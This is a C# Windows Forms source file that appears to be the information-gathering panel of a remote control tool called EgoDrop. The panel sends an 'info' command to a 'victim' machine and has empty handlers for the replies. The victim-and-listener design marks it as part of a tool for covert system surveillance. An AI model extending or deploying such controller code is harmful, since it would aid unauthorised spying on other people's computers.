using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace EgoDrop
{
    public partial class frmInfoSpyder : Form
    {
        public string m_szVictimID { get; init; }
        public clsVictim m_victim { get; init; }

        public frmInfoSpyder(string szVictimID, clsVictim victim)
        {
            InitializeComponent();

            m_szVictimID = szVictimID;
            m_victim = victim;
        }

        void fnRecv(clsListener ltn, clsVictim victim, string szVictimID, List<string> lsMsg)
        {
            if (!clsTools.fnbSameVictim(victim, m_victim) || !string.Equals(m_szVictimID, szVictimID))
                return;

            Invoke(new Action(() =>
            {
                if (lsMsg[0] == "info")
                {
                    if (lsMsg[1] == "init")
                    {

                    }
                    else if (lsMsg[1] == "env")
                    {

                    }
                    else if (lsMsg[1] == "app")
                    {

                    }
                }
            }));
        }

        void fnGetInfo()
        {
            m_victim.fnSendCommand(m_szVictimID, new string[]
            {
                "info",
            });
        }

        private void fnSetup()
        {
            fnGetInfo();
        }

        private void frmInfoSpyder_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            fnGetInfo();
        }
    }
}
